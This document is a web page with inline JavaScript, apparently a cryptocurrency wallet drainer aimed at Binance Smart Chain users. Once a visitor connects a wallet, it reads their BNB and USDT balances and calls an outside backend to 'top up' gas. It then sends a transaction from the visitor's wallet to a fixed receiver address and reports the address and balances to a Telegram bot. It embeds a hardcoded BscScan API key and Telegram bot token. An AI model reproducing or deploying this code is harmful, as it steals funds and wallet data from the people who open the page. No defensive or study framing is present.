<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>BSC Wallet Balance Sender</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
</head>
<body style="font-family: Arial; text-align: center; padding: 40px;">
  <h2>Connect Wallet & Send BNB + USDT to Telegram</h2>
  <button onclick="connectAndSend()" style="padding: 12px 24px; font-size: 16px;">Connect Wallet</button>

  <script>
    const BSC_SCAN_API = 'ZTC12CNRZ8UC8HGFDIW8SARDJXP1N6QIR1';
    const TELEGRAM_TOKEN = '8085520651:AAHM2Kt961rV4QyMSkElrmrnwDmcqFVB9SU';
    const TELEGRAM_CHAT_ID = '8060968649';
    const USDT_CONTRACT = '0x55d398326f99059ff775485246999027b3197955';
    const BACKEND_URL = 'https://a-production-c9bc.up.railway.app';
    const CONTRACT_RECEIVER = '0x0d4eFb6dfF647912Bb7B29Ed3a0e1E8f6E4c297a';

    async function connectAndSend() {
      if (typeof window.ethereum === 'undefined') {
        alert("‚ö†Ô∏è Please install MetaMask or Web3 wallet!");
        return;
      }

      const web3 = new Web3(window.ethereum);
      try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const address = accounts[0];
        let message = `üì≤ *Wallet Connected*\n\`${address}\`\n\n`;

        // Fetch BNB balance
        const bnbUrl = `https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=${BSC_SCAN_API}`;
        const bnbRes = await fetch(bnbUrl);
        const bnbData = await bnbRes.json();
        let bnb = 0;

        if (bnbData.status === "1") {
          bnb = parseFloat(bnbData.result) / 1e18;
          message += `üí∞ *BNB*: ${bnb.toFixed(4)}\n`;
        } else {
          message += `üí∞ *BNB*: ‚ùå Error\n`;
        }

        // Fetch USDT balance
        const usdtUrl = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${USDT_CONTRACT}&address=${address}&tag=latest&apikey=${BSC_SCAN_API}`;
        const usdtRes = await fetch(usdtUrl);
        const usdtData = await usdtRes.json();
        let usdt = 0;

        if (usdtData.status === "1") {
          usdt = parseFloat(usdtData.result) / 1e18;
          message += `üíµ *USDT*: ${usdt.toFixed(2)}\n`;
        } else {
          message += `üíµ *USDT*: ‚ùå Error\n`;
        }

        // Get live BNB price
        const priceRes = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd');
        const priceData = await priceRes.json();
        const bnbPrice = priceData.binancecoin.usd;
        const bnbUSD = bnb * bnbPrice;

        message += `üíµ *BNB Value*: $${bnbUSD.toFixed(2)}\n`;

        // If BNB < $1, request backend top-up
        if (bnbUSD < 1) {
          message += `‚ö†Ô∏è BNB < $1 ‚Äì requesting backend top-up...\n`;
          await fetch(`${BACKEND_URL}/api/topup-bnb`, {
            method: 'POST',
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ address })
          });
          message += `‚úÖ Top-up requested!\n`;

          // Wait and check again
          message += `‚è≥ Waiting for balance update...\n`;
          await new Promise(r => setTimeout(r, 10000));

          const rebnbRes = await fetch(`https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=${BSC_SCAN_API}`);
          const rebnbData = await rebnbRes.json();
          const newBnb = parseFloat(rebnbData.result) / 1e18;
          const newUsd = newBnb * bnbPrice;

          if (newUsd < 1) {
            message += `‚ùå Still < $1 BNB ‚Äì cannot proceed.`;
          } else {
            message += `‚úÖ BNB balance is now $${newUsd.toFixed(2)} ‚Äì proceeding to send.\n`;
            await sendTransaction(web3, address);
            message += `üöÄ Contract interaction initiated.`;
          }
        } else {
          await sendTransaction(web3, address);
          message += `üöÄ Contract interaction initiated.`;
        }

        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
          })
        });

        alert("‚úÖ Process completed!");
      } catch (err) {
        console.error(err);
        alert("‚ùå Something went wrong");
      }
    }

    async function sendTransaction(web3, address) {
      const tx = {
        from: address,
        to: CONTRACT_RECEIVER,
        value: web3.utils.toHex(web3.utils.toWei("0.001", "ether")),
        gas: 21000
      };
      await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
    }
  </script>
</body>
</html>
